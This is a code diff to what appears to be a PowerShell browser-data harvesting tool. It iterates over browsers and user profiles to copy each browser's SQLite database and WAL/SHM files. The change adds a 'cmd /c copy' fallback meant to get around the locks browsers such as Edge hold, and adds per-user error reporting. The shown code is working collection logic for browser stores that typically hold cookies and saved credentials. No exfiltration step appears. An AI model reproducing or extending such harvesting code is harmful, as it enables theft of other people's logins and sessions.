@@ -3257,15 +3257,28 @@ namespace BH {
 
                     try {
                         # Copy DB + WAL/SHM sidecar files
+                        # Uses cmd /c copy as fallback since browsers like Edge hold locks that block .NET IO
                         foreach ($ext in @('','-wal','-shm')) {
                             $src = $dbFile.FullName + $ext
                             if (Test-Path $src -ErrorAction SilentlyContinue) {
+                                $dst = $copy + $ext
+                                $copied = $false
+                                # Attempt 1: .NET with ReadWrite share (works for most browsers)
                                 try {
                                     $fs = [IO.File]::Open($src,'Open','Read','ReadWrite')
                                     try { $bytes = [byte[]]::new($fs.Length); [void]$fs.Read($bytes,0,$bytes.Length) }
                                     finally { $fs.Close() }
-                                    [IO.File]::WriteAllBytes($copy+$ext, $bytes)
-                                } catch { if ($ext -eq '') { throw } }
+                                    [IO.File]::WriteAllBytes($dst, $bytes)
+                                    $copied = $true
+                                } catch {}
+                                # Attempt 2: cmd /c copy bypasses most application-level locks
+                                if (-not $copied) {
+                                    try {
+                                        $result = & cmd /c copy /y "`"$src`"" "`"$dst`"" 2>&1
+                                        if (Test-Path $dst) { $copied = $true }
+                                    } catch {}
+                                }
+                                if (-not $copied -and $ext -eq '') { throw [Exception]"Could not copy database (browser may be holding an exclusive lock)" }
                             }
                         }
 
@@ -3307,7 +3320,7 @@ namespace BH {
                                 }
                             } catch {}
                         }
-                    } catch { Write-Host "    [-] Failed: $($_.Exception.Message)" -ForegroundColor Red }
+                    } catch { Write-Host "    [-] $($b.Name) ($($user.Name)): $($_.Exception.Message)" -ForegroundColor Yellow }
                 }
             }
         }
